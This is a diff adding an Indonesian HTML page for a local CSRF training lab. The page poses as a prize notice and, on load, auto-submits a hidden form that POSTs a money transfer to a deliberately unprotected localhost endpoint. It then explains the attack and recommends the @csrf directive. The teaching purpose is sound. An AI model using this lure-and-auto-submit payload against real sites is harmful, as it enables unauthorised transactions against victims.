@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉 Selamat! Anda Menang Hadiah!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #dc3545 0%, #a71d2a 100%);
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .container { max-width: 600px; }
+        .prize-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        h1 { font-size: 2.5rem; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        h2 { font-size: 1.2rem; font-weight: normal; margin-bottom: 30px; }
+        .loading {
+            background: rgba(0,0,0,0.3);
+            padding: 20px 40px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .info-box {
+            background: rgba(0,0,0,0.3);
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 30px;
+            text-align: left;
+        }
+        .info-box h3 { color: #ffd93d; margin-bottom: 15px; }
+        .hidden { display: none; }
+        code { background: rgba(0,0,0,0.3); padding: 2px 8px; border-radius: 3px; font-family: monospace; }
+        ul { margin-left: 20px; line-height: 2; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="prize-icon">🎁</div>
+        <h1>SELAMAT!</h1>
+        <h2>Anda Memenangkan Hadiah Rp 100.000.000!</h2>
+
+        <div class="loading">
+            <div class="spinner"></div>
+            <p>Memproses hadiah Anda...</p>
+            <small style="opacity: 0.7;">Mohon tunggu sebentar</small>
+        </div>
+
+        <!--
+        ⚠️ CSRF ATTACK FORM
+        Form tersembunyi yang auto-submit ke endpoint VULNERABLE
+        Korban tidak perlu melakukan apapun - form langsung terkirim!
+        -->
+        <form action="http://127.0.0.1:8000/csrf-lab/vulnerable-transfer" method="POST" class="hidden" id="attackForm">
+            <input name="to" value="Hacker_External_Attack">
+            <input name="amount" value="2500000">
+            <input name="source" value="external_csrf_attack">
+        </form>
+
+        <div class="info-box">
+            <h3>⚠️ INI ADALAH SIMULASI SERANGAN CSRF!</h3>
+            <p style="margin-bottom: 15px;">
+                Halaman ini mensimulasikan serangan <strong>Cross-Site Request Forgery</strong>.
+                Form tersembunyi di halaman ini telah di-submit secara <strong>otomatis</strong>!
+            </p>
+
+            <h4 style="margin-bottom: 10px; color: #ff6b6b;">Apa yang Terjadi:</h4>
+            <ul>
+                <li>Form tersembunyi berisi request transfer uang</li>
+                <li>Form di-submit <strong>otomatis</strong> saat halaman dimuat</li>
+                <li>Korban tidak perlu klik apapun!</li>
+                <li>Uang Rp 2.500.000 ditransfer ke "Hacker_External_Attack"</li>
+            </ul>
+
+            <h4 style="margin-top: 20px; margin-bottom: 10px; color: #ffd93d;">Target Endpoint:</h4>
+            <p>
+                <code>/csrf-lab/vulnerable-transfer</code><br>
+                <small style="opacity: 0.8;">
+                    Endpoint ini TIDAK dilindungi CSRF middleware (sengaja untuk demo)
+                </small>
+            </p>
+
+            <p style="margin-top: 20px; padding: 10px; background: rgba(255,107,107,0.2); border-radius: 5px;">
+                <strong>💡 Pelajaran:</strong> Selalu gunakan <code>@csrf</code> directive di semua form
+                dan jangan pernah exclude route dari CSRF middleware kecuali untuk API stateless!
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Auto-submit form saat halaman dimuat
+        // Ini adalah cara kerja serangan CSRF yang sebenarnya - tanpa interaksi user
+        window.onload = function() {
+            // Coba deteksi URL Laravel yang benar
+            // Prioritas: 127.0.0.1:8000 -> localhost:8000
+            const possibleUrls = [
+                'http://127.0.0.1:8000',
+                'http://localhost:8000'
+            ];
+
+            // Gunakan URL pertama (bisa disesuaikan)
+            const targetUrl = possibleUrls[0];
+            document.getElementById('attackForm').action = targetUrl + '/csrf-lab/vulnerable-transfer';
+
+            // Submit form setelah delay singkat (agar user bisa melihat halaman)
+            setTimeout(function() {
+                document.getElementById('attackForm').submit();
+            }, 1500);
+        };
+    </script>
+</body>
+</html>
